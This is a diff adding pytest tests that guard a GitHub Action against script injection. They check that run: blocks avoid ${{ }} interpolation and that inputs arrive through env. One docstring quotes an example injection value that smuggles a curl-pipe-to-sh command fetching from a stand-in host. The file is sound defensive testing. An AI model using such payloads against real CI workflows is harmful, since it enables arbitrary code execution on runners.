@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import json
+import re
 from pathlib import Path
 
 import pytest
@@ -28,6 +29,85 @@ class TestActionDefinition:
 
         for expected in ("server:", "transport:", "fail-on:", "json-report:", "env:", "python-version:", "mcplock-version:"):
             assert expected in content
+
+
+ACTION_PATH = Path(__file__).parent.parent / ".github" / "actions" / "mcp-lock-action" / "action.yml"
+
+
+def _run_blocks() -> list[tuple[int, str]]:
+    """Return (line_number, text) for every ``run:`` script block in the Action."""
+    lines = ACTION_PATH.read_text(encoding="utf-8").splitlines()
+    blocks: list[tuple[int, str]] = []
+
+    index = 0
+    while index < len(lines):
+        match = re.match(r"^(\s*)run:\s*\|", lines[index])
+        if not match:
+            index += 1
+            continue
+
+        indent = len(match.group(1))
+        start = index + 2
+        body: list[str] = []
+        index += 1
+        while index < len(lines):
+            line = lines[index]
+            if line.strip() and (len(line) - len(line.lstrip())) <= indent:
+                break
+            body.append(line)
+            index += 1
+        blocks.append((start, "\n".join(body)))
+
+    return blocks
+
+
+class TestActionScriptInjection:
+    """GitHub substitutes ``${{ ... }}`` into the script *before* bash parses it.
+
+    Any expression inside a ``run:`` block is therefore a script-injection vector
+    regardless of quoting — a ``server`` input of ``foo"; curl evil.sh | sh; #``
+    executes on the runner. Caller input must arrive via ``env:`` and be read as a
+    shell variable. This was a live defect, not a hypothetical.
+    """
+
+    def test_run_blocks_were_found(self) -> None:
+        """Guard the guard — a parser that finds nothing would pass vacuously."""
+        assert len(_run_blocks()) >= 2
+
+    def test_no_expression_interpolation_inside_run(self) -> None:
+        offenders = [
+            (line_no, ln.strip())
+            for line_no, body in _run_blocks()
+            for ln in body.splitlines()
+            if "${{" in ln
+        ]
+
+        assert not offenders, (
+            "GitHub expression interpolated into a run: block. Pass it via `env:` "
+            "and reference it as a shell variable — substitution happens before "
+            f"bash parses the script, so quoting does not help. Offenders: {offenders}"
+        )
+
+    def test_caller_inputs_are_passed_through_env(self) -> None:
+        content = ACTION_PATH.read_text(encoding="utf-8")
+
+        for name in ("MCPLOCK_SERVER", "MCPLOCK_ENV", "MCPLOCK_VERSION"):
+            assert name in content, f"{name} should carry caller input into the script"
+
+    def test_env_pairs_split_without_reevaluation(self) -> None:
+        """``for pair in $VAR`` word-splits *and* globs; ``read -ra`` does neither.
+
+        Comment lines are skipped — the Action documents the unsafe form in a
+        comment explaining why it is not used.
+        """
+        code = [
+            ln
+            for ln in ACTION_PATH.read_text(encoding="utf-8").splitlines()
+            if not ln.lstrip().startswith("#")
+        ]
+
+        assert any("read -ra" in ln for ln in code)
+        assert not [ln for ln in code if re.search(r"for\s+\w+\s+in\s+\$\{?MCPLOCK_ENV", ln)]
 
 
 @pytest.mark.e2e
